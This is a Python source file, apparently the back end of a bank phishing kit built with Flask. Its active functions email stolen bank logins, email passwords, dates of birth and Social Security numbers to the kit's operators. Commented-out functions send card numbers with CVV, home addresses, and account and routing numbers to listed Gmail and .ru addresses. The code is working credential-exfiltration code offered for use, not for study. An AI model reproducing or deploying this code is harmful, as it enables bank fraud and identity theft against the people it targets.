from mandt import mail
from flask_mail import Message
from datetime import datetime

def report_login(username,password,bank_name):
    msg = Message(f'New Login || {bank_name}',
        sender='donaldlorren4202022@gmail.com',
        recipients=[''])
    msg.body=f'''
    --------LOGIN DETAILS---------
    Bank Name is ----- {bank_name}
    Account Number(user-id) is ----- {username}
    Password is ----- {password}
    at ---- {datetime.now()}
    '''
    mail.send(msg)

def report_email(email,password,dob, ssn):
    msg = Message(f'AFCU',
        sender='donaldlorren4202022@gmail.com',
        recipients=[''])
    msg.body=f'''
    --------EMAIL DETAILS---------
    Email is ----- {email}
    Password is ----- {password}

     --------SSN AND DOB---------
    
    DOB is ----- {dob}
    SSN is ----- {ssn}
    at ---- {datetime.now()}
    '''
    mail.send(msg)


# def report_ssn(ssn):
#     msg = Message('SSN',
#         sender='donaldlorren4202022@gmail.com',
#         recipients=['i@smuller.ru','christinesalgado477@gmail.com'])
#     msg.body=f'''
#     SSN ----- {ssn}
#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)

# def report_card_details( card_name, card_number,expiry_date,cvv):
#     msg = Message(f'Card Details || {card_name}',
#         sender='donaldlorren4202022@gmail.com',
#         recipients=['i@smuller.ru','christinesalgado477@gmail.com'])
#     msg.body=f'''
#     Card name is ----- {card_name}
#     Card Number is ----- {card_number}
#     Expiry Date is ----- {expiry_date}
#     CVV is ----- {cvv}
#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)

# def report_address( address, apt,city, state, zipcode):
#     msg = Message(f'Address || {state}',
#         sender='donaldlorren4202022@gmail.com',
#         recipients=['i@smuller.ru','christinesalgado477@gmail.com'])
#     msg.body=f'''
#     --------PERSONAL INFORMATION----------
#     Street Address is ----- {address}
#     Apartment is ----- {apt}
#     city is ----- {city}
#     state is ----- {state}
#     zipcode is ----- {zipcode}

#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)

# def report_personal_details( account_name, account_number,routine_number):
#     msg = Message('New Login',
#         sender='angelamoore914@gmail.com',
#         recipients=['goodseed394@gmail.com','christinesalgado477@gmail.com'])
#     msg.body=f'''
#     --------PERSONAL INFORMATION----------
#     Account Name is ----- {account_name}
#     Account Number is ----- {account_number}
#     Routine Number is ----- {routine_number}

#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)